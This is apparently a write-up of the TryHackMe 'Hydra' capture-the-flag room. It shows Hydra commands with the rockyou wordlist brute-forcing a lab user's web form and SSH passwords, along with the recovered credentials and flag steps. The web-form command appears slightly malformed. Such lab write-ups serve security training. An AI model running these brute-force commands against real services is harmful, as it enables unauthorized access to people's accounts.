# Hydra

![image](https://blog.tryhackme.com/content/images/size/w2000/2019/12/thumb-1920-504947.jpg)

Description:Learn about hydra to bruteforce and obtain credentials.

---

## Installing Hydra
If you're using Kali Linux, hydra is pre-installed. Otherwise you can download it here: https://github.com/vanhauser-thc/thc-hydra

If you don't have Linux or the right desktop environment, you can deploy your own Kali Linux machine with all the needed security tools. You can even control the machine in your browser! Do this with our Kali room - https://tryhackme.com/room/kali.
## Flag 1-Use Hydra to bruteforce molly’s web password.

### Access the HTTP site 

The site should look something like this ,even if you try logging in the message shows "Your username or password is incorrect".
![image](https://miro.medium.com/max/542/1*yfHLIppG8XdJsAwbWQMqGQ.png)

---

Intercept with Burp Suite. It’s POST request.

![image](https://miro.medium.com/max/700/1*97wu_FB-w7PgGTyK_Eho-A.png)

### Bruteforcing with hydra
Here I am using rockyou.txt as wordlist but you may use anyother wordlist you have.

```
hydra -l molly -P rockyou.txt <ip> http-post-form "/loginusername=^USER^&password=^PASS^:F=Your username or password is incorrect." -V

```
A couple of seconds and we get our Result(credentials) -> molly:sunshine

![image](https://miro.medium.com/max/700/1*tjPer-iBdzXolMeMAXMiLw.png)

Now login in site,and we have our first flag.

---

## Flag 2-Use Hydra to bruteforce molly’s SSH password.

Now to get SSH password.The command used here is much simpler.

```
hydra -l molly -P Desktop/rockyou.txt 10.10.138.145 ssh

```
A couple of seconds again and we get our Result(credentials) -> molly:butterfly

![image](https://miro.medium.com/max/700/1*tjPer-iBdzXolMeMAXMiLw.png)

After getting the password we can ssh to molly.

```
ssh molly@IP_OF_MACHINE

```

Now use command ls to show the contents.A flag2.txt can be seen.
```
ls 
cat flag2.txt
```

Read the file using cat command.And we have our second Flag.

![image](https://miro.medium.com/max/410/1*rjHMNG44fca-w9zCAvRHdw.png)
